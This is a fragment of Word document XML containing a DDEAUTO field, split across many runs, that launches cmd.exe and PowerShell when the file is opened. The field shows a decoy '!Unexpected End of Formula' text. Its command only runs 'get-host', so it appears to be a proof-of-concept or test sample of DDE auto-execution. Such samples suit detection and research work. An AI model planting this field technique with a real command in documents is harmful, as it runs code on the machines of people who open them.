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9204E" w:rsidRPr="00550738" w:rsidRDefault="00550738" w:rsidP="00550738">
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> DDEAUTO C:\\windows</w:instrText>
      </w:r>
      <w:r w:rsidR="00460EF9">
        <w:instrText>\</w:instrText>
      </w:r>
      <w:r w:rsidR="00D20F29">
        <w:instrText>\system32\\cmd.exe "</w:instrText>
      </w:r>
      <w:r w:rsidR="00F2650F">
        <w:instrText>/</w:instrText>
      </w:r>
      <w:r w:rsidR="007C092B">
        <w:instrText xml:space="preserve">k </w:instrText>
      </w:r>
      <w:r w:rsidR="002B0BDB">
        <w:instrText>powershell</w:instrText>
      </w:r>
      <w:r w:rsidR="00266D82">
        <w:instrText>.exe</w:instrText>
      </w:r>
      <w:r w:rsidR="002B0BDB">
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidR="00DD12C3">
        <w:instrText>get-host</w:instrText>
      </w:r>
      <w:r w:rsidR="005C556F">
        <w:instrText>"</w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:t>!Unexpected End of Formula</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00A9204E" w:rsidRPr="0055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4C"/>
    <w:rsid w:val="00266D82"/>
    <w:rsid w:val="00267D2C"/>
    <w:rsid w:val="002B0BDB"/>
    <w:rsid w:val="003247D1"/>
    <w:rsid w:val="00460EF9"/>
    <w:rsid w:val="004B4602"/>
    <w:rsid w:val="00550738"/>
    <w:rsid w:val="005C556F"/>
    <w:rsid w:val="00645252"/>
    <w:rsid w:val="006D3D74"/>
    <w:rsid w:val="007C092B"/>
    <w:rsid w:val="0083569A"/>
    <w:rsid w:val="00A746FC"/>
    <w:rsid w:val="00A9204E"/>
    <w:rsid w:val="00AE1D6A"/>
    <w:rsid w:val="00D20F29"/>
    <w:rsid w:val="00D5664C"/>
    <w:rsid w:val="00DD12C3"/>
    <w:rsid w:val="00F2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8AB6D9-8FF9-4E58-8BF0-8636B74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</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>luks</cp:lastModifiedBy>
  <cp:revision>18</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-08-05T08:43:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2020-08-05T09:07:00Z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